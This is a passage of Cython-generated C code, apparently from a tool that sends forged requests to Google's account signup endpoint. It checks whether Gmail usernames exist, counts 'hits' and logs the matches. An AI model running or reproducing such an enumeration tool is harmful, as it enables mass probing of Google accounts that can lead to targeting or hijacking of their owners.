        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
        goto __pyx_L3_error;
        __pyx_L11_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
        __pyx_L15_try_end:;
      }

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_o, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 388, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_7 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_12, __pyx_kp_u__32) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u__32);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 388, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if ((likely(PyTuple_CheckExact(__pyx_t_7))) || (PyList_CheckExact(__pyx_t_7))) {
        PyObject* sequence = __pyx_t_7;
        Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
        if (unlikely(size != 2)) {
          if (size > 2) __Pyx_RaiseTooManyValuesError(2);
          else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
          __PYX_ERR(0, 388, __pyx_L3_error)
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        if (likely(PyTuple_CheckExact(sequence))) {
          __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
          __pyx_t_12 = PyTuple_GET_ITEM(sequence, 1); 
        } else {
          __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
          __pyx_t_12 = PyList_GET_ITEM(sequence, 1); 
        }
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_12);
        #else
        __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 388, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_12 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 388, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        #endif
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      } else {
        Py_ssize_t index = -1;
        __pyx_t_16 = PyObject_GetIter(__pyx_t_7); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 388, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_17 = Py_TYPE(__pyx_t_16)->tp_iternext;
        index = 0; __pyx_t_6 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_6)) goto __pyx_L18_unpacking_failed;
        __Pyx_GOTREF(__pyx_t_6);
        index = 1; __pyx_t_12 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_12)) goto __pyx_L18_unpacking_failed;
        __Pyx_GOTREF(__pyx_t_12);
        if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_16), 2) < 0) __PYX_ERR(0, 388, __pyx_L3_error)
        __pyx_t_17 = NULL;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L19_unpacking_done;
        __pyx_L18_unpacking_failed:;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_17 = NULL;
        if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
        __PYX_ERR(0, 388, __pyx_L3_error)
        __pyx_L19_unpacking_done:;
      }
      __pyx_v_tl = __pyx_t_6;
      __pyx_t_6 = 0;
      __pyx_v_host = __pyx_t_12;
      __pyx_t_12 = 0;

      
      __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 391, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_Host_GAPS, __pyx_v_host) < 0) __PYX_ERR(0, 391, __pyx_L3_error)
      __pyx_v_cookies = ((PyObject*)__pyx_t_7);
      __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 394, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_authority, __pyx_kp_u_accounts_google_com) < 0) __PYX_ERR(0, 394, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_accept, __pyx_kp_u__25) < 0) __PYX_ERR(0, 394, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 394, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 394, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 394, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_origin, __pyx_kp_u_https_accounts_google_com) < 0) __PYX_ERR(0, 394, __pyx_L3_error)

      
      __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_v_tl, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 400, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_6 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_accounts_google_com_signup_2, __pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 400, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_referer, __pyx_t_6) < 0) __PYX_ERR(0, 394, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_ggb); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 401, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_16 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_16)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_16);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
        }
      }
      __pyx_t_6 = (__pyx_t_16) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_16) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 401, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_user_agent, __pyx_t_6) < 0) __PYX_ERR(0, 394, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_headers = ((PyObject*)__pyx_t_7);
      __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 404, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_TL, __pyx_v_tl) < 0) __PYX_ERR(0, 404, __pyx_L3_error)
      __pyx_v_params = ((PyObject*)__pyx_t_7);
      __pyx_t_7 = 0;

      
      __pyx_t_7 = PyTuple_New(5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 406, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_18 = 0;
      __pyx_t_19 = 127;
      __Pyx_INCREF(__pyx_kp_u_continue_https_3A_2F_2Fmail_goog);
      __pyx_t_18 += 119;
      __Pyx_GIVEREF(__pyx_kp_u_continue_https_3A_2F_2Fmail_goog);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_continue_https_3A_2F_2Fmail_goog);

      
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_tl, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 407, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_19 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_19) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_19;
      __pyx_t_18 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u_22_2C_22);
      __pyx_t_18 += 9;
      __Pyx_GIVEREF(__pyx_kp_u_22_2C_22);
      PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_22_2C_22);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_email, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 407, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_19 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_19) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_19;
      __pyx_t_18 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516);
      __pyx_t_18 += 360;
      __Pyx_GIVEREF(__pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516);
      PyTuple_SET_ITEM(__pyx_t_7, 4, __pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516);

      
      __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_7, 5, __pyx_t_18, __pyx_t_19); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 406, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_data = ((PyObject*)__pyx_t_6);
      __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_pp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 409, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);

      
      __pyx_t_7 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 411, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 411, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 411, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 411, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 411, __pyx_L3_error)

      
      __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__41, __pyx_t_7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 409, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_response = __pyx_t_12;
      __pyx_t_12 = 0;

      
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 416, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 416, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_5 = (__Pyx_PyUnicode_ContainsTF(__pyx_kp_u_gf_uar_1, __pyx_t_7, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 416, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_4 = (__pyx_t_5 != 0);
      if (__pyx_t_4) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_hits); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 417, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_12 = __Pyx_PyInt_AddObjC(__pyx_t_7, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 417, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_hits, __pyx_t_12) < 0) __PYX_ERR(0, 417, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_pppp); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_6 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_12 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        
        __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u__39, __pyx_v_email, Py_NE)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 419, __pyx_L3_error)
        __pyx_t_5 = (__pyx_t_4 != 0);
        if (__pyx_t_5) {

          
          __pyx_t_12 = PyNumber_Add(__pyx_v_email, __pyx_kp_u_gmail_com); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 420, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_v_ok = __pyx_t_12;
          __pyx_t_12 = 0;

          
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_ok, __pyx_n_s_split); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 421, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_12 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_6, __pyx_kp_u__39) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_kp_u__39);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 421, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          if ((likely(PyTuple_CheckExact(__pyx_t_12))) || (PyList_CheckExact(__pyx_t_12))) {
            PyObject* sequence = __pyx_t_12;
            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
            if (unlikely(size != 2)) {
              if (size > 2) __Pyx_RaiseTooManyValuesError(2);
              else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
              __PYX_ERR(0, 421, __pyx_L3_error)
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            if (likely(PyTuple_CheckExact(sequence))) {
              __pyx_t_7 = PyTuple_GET_ITEM(sequence, 0); 
              __pyx_t_6 = PyTuple_GET_ITEM(sequence, 1); 
            } else {
              __pyx_t_7 = PyList_GET_ITEM(sequence, 0); 
              __pyx_t_6 = PyList_GET_ITEM(sequence, 1); 
            }
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_6);
            #else
            __pyx_t_7 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 421, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_6 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 421, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            #endif
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else {
            Py_ssize_t index = -1;
            __pyx_t_16 = PyObject_GetIter(__pyx_t_12); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 421, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __pyx_t_17 = Py_TYPE(__pyx_t_16)->tp_iternext;
            index = 0; __pyx_t_7 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_7)) goto __pyx_L22_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_7);
            index = 1; __pyx_t_6 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_6)) goto __pyx_L22_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_6);
            if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_16), 2) < 0) __PYX_ERR(0, 421, __pyx_L3_error)
            __pyx_t_17 = NULL;
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            goto __pyx_L23_unpacking_done;
            __pyx_L22_unpacking_failed:;
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_17 = NULL;
            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
            __PYX_ERR(0, 421, __pyx_L3_error)
            __pyx_L23_unpacking_done:;
          }
          __pyx_v_username = __pyx_t_7;
          __pyx_t_7 = 0;
          __pyx_v_gg = __pyx_t_6;
          __pyx_t_6 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_InfoAcc); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 422, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_7 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_6)) {
            PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_v_username, __pyx_v_gg};
            __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 422, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GOTREF(__pyx_t_12);
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
            PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_v_username, __pyx_v_gg};
            __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 422, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GOTREF(__pyx_t_12);
          } else
          #endif
          {
            __pyx_t_16 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 422, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            if (__pyx_t_7) {
              __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_t_7); __pyx_t_7 = NULL;
            }
            __Pyx_INCREF(__pyx_v_username);
            __Pyx_GIVEREF(__pyx_v_username);
            PyTuple_SET_ITEM(__pyx_t_16, 0+__pyx_t_13, __pyx_v_username);
            __Pyx_INCREF(__pyx_v_gg);
            __Pyx_GIVEREF(__pyx_v_gg);
            PyTuple_SET_ITEM(__pyx_t_16, 1+__pyx_t_13, __pyx_v_gg);
            __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_16, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 422, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          }
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

          
          goto __pyx_L21;
        }

        
        /*else*/ {
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_email, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 424, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_16 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
            }
          }
          __pyx_t_12 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_16, __pyx_kp_u__39) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u__39);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 424, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if ((likely(PyTuple_CheckExact(__pyx_t_12))) || (PyList_CheckExact(__pyx_t_12))) {
            PyObject* sequence = __pyx_t_12;
            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
            if (unlikely(size != 2)) {
              if (size > 2) __Pyx_RaiseTooManyValuesError(2);
              else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
              __PYX_ERR(0, 424, __pyx_L3_error)
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            if (likely(PyTuple_CheckExact(sequence))) {
              __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
              __pyx_t_16 = PyTuple_GET_ITEM(sequence, 1); 
            } else {
              __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
              __pyx_t_16 = PyList_GET_ITEM(sequence, 1); 
            }
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_16);
            #else
            __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 424, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_16 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 424, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            #endif
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else {
            Py_ssize_t index = -1;
            __pyx_t_7 = PyObject_GetIter(__pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 424, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __pyx_t_17 = Py_TYPE(__pyx_t_7)->tp_iternext;
            index = 0; __pyx_t_6 = __pyx_t_17(__pyx_t_7); if (unlikely(!__pyx_t_6)) goto __pyx_L24_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_6);
            index = 1; __pyx_t_16 = __pyx_t_17(__pyx_t_7); if (unlikely(!__pyx_t_16)) goto __pyx_L24_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_16);
            if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_7), 2) < 0) __PYX_ERR(0, 424, __pyx_L3_error)
            __pyx_t_17 = NULL;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            goto __pyx_L25_unpacking_done;
            __pyx_L24_unpacking_failed:;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_17 = NULL;
            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
            __PYX_ERR(0, 424, __pyx_L3_error)
            __pyx_L25_unpacking_done:;
          }
          __pyx_v_username = __pyx_t_6;
          __pyx_t_6 = 0;
          __pyx_v_gg = __pyx_t_16;
          __pyx_t_16 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_InfoAcc); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 425, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_6 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_16)) {
            PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_v_username, __pyx_v_gg};
            __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_16, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 425, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_GOTREF(__pyx_t_12);
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_16)) {
            PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_v_username, __pyx_v_gg};
            __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_16, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 425, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_GOTREF(__pyx_t_12);
          } else
          #endif
          {
            __pyx_t_7 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 425, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            if (__pyx_t_6) {
